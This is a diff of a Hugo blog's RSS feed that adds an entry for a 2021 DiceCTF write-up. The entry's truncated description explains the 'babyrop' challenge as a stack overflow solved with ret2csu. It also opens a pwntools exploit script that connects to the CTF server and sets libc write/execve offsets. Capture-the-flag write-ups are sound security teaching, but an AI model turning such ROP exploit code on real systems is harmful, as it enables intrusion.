@@ -7,7 +7,18 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-    <lastBuildDate>Sun, 07 Feb 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://vergissmeinnichtz.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 08 Feb 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://vergissmeinnichtz.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>2021DiceCTF-WriteUp</title>
+      <link>https://vergissmeinnichtz.github.io/posts/2021dicectf-writeup/</link>
+      <pubDate>Mon, 08 Feb 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://vergissmeinnichtz.github.io/posts/2021dicectf-writeup/</guid>
+      <description>Introduction This is a small write up and recurrence for 2021DiceCTF.
+Pwn babyrop Analysis Just a stack overflow and use csu to solve it. Notice that some registers are different for csu.
+Exp from pwn import * context.log_level = &amp;#34;debug&amp;#34; context.terminal = [&amp;#39;tmux&amp;#39;, &amp;#39;splitw&amp;#39;, &amp;#39;-h&amp;#39;] LOCAL = 0 DEBUG = 0 if LOCAL: r = process(&amp;#34;./babyrop&amp;#34;) libc = ELF(&amp;#34;/lib/x86_64-linux-gnu/libc.so.6&amp;#34;) write_offset = libc.sym[&amp;#34;write&amp;#34;] system_offset = libc.sym[&amp;#34;execve&amp;#34;] else: r = remote(&amp;#34;dicec.tf&amp;#34;,31924) write_offset = 0x1111d0 system_offset = 0xe62f0 if DEBUG: gdb.</description>
+    </item>
+    
     <item>
       <title>About</title>
       <link>https://vergissmeinnichtz.github.io/about/</link>
